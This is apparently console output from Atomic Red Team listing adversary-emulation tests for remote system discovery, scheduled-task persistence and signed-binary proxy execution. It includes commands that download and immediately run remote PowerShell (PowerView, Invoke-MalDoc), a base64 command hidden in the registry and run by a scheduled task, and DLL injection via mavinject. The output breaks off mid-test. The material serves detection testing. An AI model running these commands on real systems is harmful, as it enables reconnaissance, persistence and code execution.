Executor: command_prompt
ElevationRequired: False
Command:
net view /domain
net view
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Remote System Discovery - net group Domain Computers
Atomic Test Number: 2
Atomic Test GUID: f1bf6c8f-9016-4edf-aff9-80b65f5d711f
Description: Identify remote systems with net.exe querying the Active Directory Domain Computers group.
Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the "Domain Computers" group. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
net group "Domain Computers" /domain
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Remote System Discovery - nltest
Atomic Test Number: 3
Atomic Test GUID: 52ab5108-3f6f-42fb-8ba3-73bc054f22c8
Description: Identify domain controllers for specified domain.
Upon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
nltest.exe /dclist:#{target_domain}
Command (with inputs):
nltest.exe /dclist:%userdnsdomain%
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Remote System Discovery - ping sweep
Atomic Test Number: 4
Atomic Test GUID: 6db1f57f-d1d5-4223-8a66-55c9c65a9592
Description: Identify remote systems via ping sweep.
Upon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i
Command (with inputs):
for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Remote System Discovery - arp
Atomic Test Number: 5
Atomic Test GUID: 2d5a61f5-0447-4be4-944a-1f8530ed6574
Description: Identify remote systems via arp. 
Upon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
arp -a
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Remote System Discovery - nslookup
Atomic Test Number: 8
Atomic Test GUID: baa01aaa-5e13-45ec-8a0d-e46c93c9760f
Description: Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.
Upon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$pieces = $localip.split(".")
$firstOctet = $pieces[0]
$secondOctet = $pieces[1]
$thirdOctet = $pieces[2]
foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Remote System Discovery - adidnsdump
Atomic Test Number: 9
Atomic Test GUID: 95e19466-469e-4316-86d2-1dc401b5a959
Description: This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and adidnsdump must be installed, use the get
_prereq_command's to meet the prerequisites for this test. Successful execution of this test will list dns zones in the terminal.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
adidnsdump -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
Command (with inputs):
adidnsdump -u domain\user -p password --print-zones 192.168.1.1

Dependencies:
Description: Computer must have python 3 installed
Check Prereq Command:
if (python --version) {exit 0} else {exit 1}
Get Prereq Command:
echo "Python 3 must be installed manually"
Description: Computer must have pip installed
Check Prereq Command:
if (pip3 -V) {exit 0} else {exit 1}
Get Prereq Command:
echo "PIP must be installed manually"
Description: adidnsdump must be installed and part of PATH
Check Prereq Command:
if (cmd /c adidnsdump -h) {exit 0} else {exit 1}
Get Prereq Command:
pip3 install adidnsdump
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Adfind - Enumerate Active Directory Computer Objects
Atomic Test Number: 10
Atomic Test GUID: a889f5be-2d54-4050-bd05-884578748bb4
Description: Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Compute
r Objects reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=computer)
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe" -f (objectcategory=computer)

Dependencies:
Description: AdFind.exe must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe)
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe"

[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Adfind - Enumerate Active Directory Domain Controller Objects
Atomic Test Number: 11
Atomic Test GUID: 5838c31e-a0e2-4b9f-b60a-d79d2cb7995e
Description: Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain 
Controller Objects reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc dclist
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe" -sc dclist

Dependencies:
Description: AdFind.exe must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe)
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe"

[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Enumerate domain computers within Active Directory using DirectorySearcher
Atomic Test Number: 15
Atomic Test GUID: 962a6017-1c09-45a6-880b-adc9c57cb22e
Description: This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain.  This test is designed to mimic how SessionGopher
 can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement.  Reference: [Head Fake: Tackling Disruptive Ransomware 
Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks).  Upon successful execution, this test will output the names of the computers that resid
e on the domain to the console window.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)")
$DirectorySearcher.PropertiesToLoad.Add("Name")
$Computers = $DirectorySearcher.findall()
foreach ($Computer in $Computers) {
  $Computer = $Computer.Properties.name
  if (!$Computer) { Continue }
  Write-Host $Computer}

Dependencies:
Description: This PC must be joined to a domain.
Check Prereq Command:
if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain -eq $true) {exit 0} else {exit 1}
Get Prereq Command:
write-host "This PC must be manually added to a domain."
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Enumerate Active Directory Computers with Get-AdComputer
Atomic Test Number: 16
Atomic Test GUID: 97e89d9e-e3f5-41b5-a90f-1e0825df0fdf
Description: The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory. Upon successful execution a listing of Computers will output with t
heir paths in AD. Reference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Get-AdComputer -Filter *
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Enumerate Active Directory Computers with ADSISearcher
Atomic Test Number: 17
Atomic Test GUID: 64ede6ac-b57a-41c2-a7d1-32c6cd35397d
Description: The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory. Upon successful execution a listing of computers will output with the
ir paths in AD. Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Get-DomainController with PowerView
Atomic Test Number: 18
Atomic Test GUID: b9d2e8ca-5520-4737-8076-4f08913da2c4
Description: Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displa
yed.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Get-WmiObject to Enumerate Domain Controllers
Atomic Test Number: 19
Atomic Test GUID: e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad
Description: The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers. Upon successful execution a listing of Systems from AD will ou
tput with their paths. Reference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
catch { $_; exit $_.Exception.HResult }
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Remote System Discovery T1018
Atomic Test Name: Remote System Discovery - net group Domain Controller
Atomic Test Number: 20
Atomic Test GUID: 5843529a-5056-4bc1-9c13-a311e2af4ca0
Description: Identify remote systems with net.exe querying the Active Directory Domain Controller. Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to
 list the "Domain Controller" in the domain. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
net group /domain "Domain controllers"
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1053\T1053.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Scheduled Task/Job: Scheduled Task T1053.005
Atomic Test Name: Scheduled Task Startup Script
Atomic Test Number: 1
Atomic Test GUID: fec27f65-db86-4c2d-b66c-61945aee87c2
Description: Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view the tasks, open the Task Scheduler a
nd look in the Active Tasks pane.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"

Cleanup Commands:
Command:
schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Scheduled Task/Job: Scheduled Task T1053.005
Atomic Test Name: Scheduled task Local
Atomic Test Number: 2
Atomic Test GUID: 42f53695-ad4a-4546-abb6-7d837f644a71
Description: Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
Command (with inputs):
SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10

Cleanup Commands:
Command:
SCHTASKS /Delete /TN spawn /F >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Scheduled Task/Job: Scheduled Task T1053.005
Atomic Test Name: Scheduled task Remote
Atomic Test Number: 3
Atomic Test GUID: 2e5eac3e-327b-4a88-a0c0-c4057039a8dd
Description: Create a task on a remote system. Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
Command (with inputs):
SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST 20:10

Cleanup Commands:
Command:
SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN "Atomic task" /F >nul 2>&1
Command (with inputs):
SCHTASKS /Delete /S localhost /U DOMAIN\user /P At0micStrong /TN "Atomic task" /F >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Scheduled Task/Job: Scheduled Task T1053.005
Atomic Test Name: Powershell Cmdlet Scheduled Task
Atomic Test Number: 4
Atomic Test GUID: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
Description: Create an atomic scheduled task that leverages native powershell cmdlets.
Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$Action = New-ScheduledTaskAction -Execute "calc.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object

Cleanup Commands:
Command:
Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false >$null 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Scheduled Task/Job: Scheduled Task T1053.005
Atomic Test Name: Task Scheduler via VBA
Atomic Test Number: 5
Atomic Test GUID: ecd3fa21-7792-41a2-8726-2c5c673414d3
Description: This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within 30 - 40 seconds after this
 module has run

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"
Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-MalDoc -macroFile "C:\AtomicRedTeam\atomics\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "Word" -sub "Scheduler"

Cleanup Commands:
Command:
Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Check Prereq Command (with inputs):
try {
  New-Object -COMObject "Word.Application" | Out-Null
  $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Get Prereq Command:
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
Get Prereq Command (with inputs):
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Scheduled Task/Job: Scheduled Task T1053.005
Atomic Test Name: WMI Invoke-CimMethod Scheduled Task
Atomic Test Number: 6
Atomic Test GUID: e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
Description: Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdl
et behind the scenes.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$xml = [System.IO.File]::ReadAllText("#{xml_path}")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
Command (with inputs):
$xml = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1053.005\src\T1053_005_WMI.xml")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }

Cleanup Commands:
Command:
Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1

Dependencies:
Description: File to copy must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1053.005\src\T1053_005_WMI.xml)
Check Prereq Command:
if (Test-Path "#{xml_path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1053.005\src\T1053_005_WMI.xml") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{xml_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml" -OutFile "#{xml_path}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1053.005\src\T1053_005_WMI.xml") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml" -OutFile "C:\AtomicRedTeam\atomics\T1053.005\src\T1053_005_WMI.x
ml"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Scheduled Task/Job: Scheduled Task T1053.005
Atomic Test Name: Scheduled Task Executing Base64 Encoded Commands From Registry
Atomic Test Number: 7
Atomic Test GUID: e895677d-4f06-49ab-91b6-ae3742d0a2ba
Description: A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created. The scheduled task will launch powershell to decode a
nd run the command in the registry daily. This is a persistence mechanism recently seen in use by Qakbot.  
[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get
-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}
Command (with inputs):
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get
-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 07:45

Cleanup Commands:
Command:
schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Scheduled Task/Job: Scheduled Task T1053.005
Atomic Test Name: Import XML Schedule Task with Hidden Attribute
Atomic Test Number: 8
Atomic Test GUID: cd925593-fbb4-486d-8def-16cbdf944bf4
Description: Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute.  This technique was seen several times in tricbot malwa
re and also with the targetted attack campaigne the industroyer2.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$xml = [System.IO.File]::ReadAllText("#{xml_path}")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
Command (with inputs):
$xml = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }

Cleanup Commands:
Command:
Unregister-ScheduledTask -TaskName "atomic red team" -confirm:$false >$null 2>&1

Dependencies:
Description: File to copy must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml)
Check Prereq Command:
if (Test-Path "#{xml_path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{xml_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml" -OutFile "#{xml_path}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml" -OutFile "C:\AtomicRedTeam\atomics\T1053.005\src
\T1053_05_SCTASK_HIDDEN_ATTRIB.xml"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Scheduled Task/Job: Scheduled Task T1053.005
Atomic Test Name: PowerShell Modify A Scheduled Task
Atomic Test Number: 9
Atomic Test GUID: dda6fc7b-c9a6-4c18-b98d-95ec6542af6d
Description: Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modifi
cation of an action on a Task already registered.  It will first be created to spawn cmd.exe, but modified to run notepad.exe.
Upon successful execution, powershell.exe will create a scheduled task and modify the action.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$Action = New-ScheduledTaskAction -Execute "cmd.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTaskModifed -InputObject $object
$NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction

Cleanup Commands:
Command:
Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false >$null 2>&1
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: mavinject - Inject DLL into running process
Atomic Test Number: 1
Atomic Test GUID: c426dacf-575d-4937-8611-a148a86a5e61
Description: Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
mavinject.exe #{process_id} /INJECTRUNNING "#{dll_payload}"
Command (with inputs):
mavinject.exe 1000 /INJECTRUNNING "C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll"

Dependencies:
Description: T1218.dll must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll)
Check Prereq Command:
if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: Register-CimProvider - Execute evil dll
Atomic Test Number: 2
Atomic Test GUID: ad2c17ed-f626-4061-b21e-b9804a6f3655
Description: Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
C:\Windows\SysWow64\Register-CimProvider.exe -Path "#{dll_payload}"
Command (with inputs):
C:\Windows\SysWow64\Register-CimProvider.exe -Path "C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll"

Dependencies:
Description: T1218-2.dll must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll)
Check Prereq Command:
if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution T1218
Atomic Test Name: InfDefaultInstall.exe .inf Execution
Atomic Test Number: 3
Atomic Test GUID: 54ad7d5a-a1b5-472c-b6c4-f8090fb2daef
Description: Test execution of a .inf using InfDefaultInstall.exe
Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
InfDefaultInstall.exe "#{inf_to_execute}"
Command (with inputs):
InfDefaultInstall.exe "C:\AtomicRedTeam\atomics\T1218\src\Infdefaultinstall.inf"

Dependencies:
Description: INF file must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1218\src\Infdefaultinstall.inf)
Check Prereq Command:
if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1218\src\Infdefaultinstall.inf") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
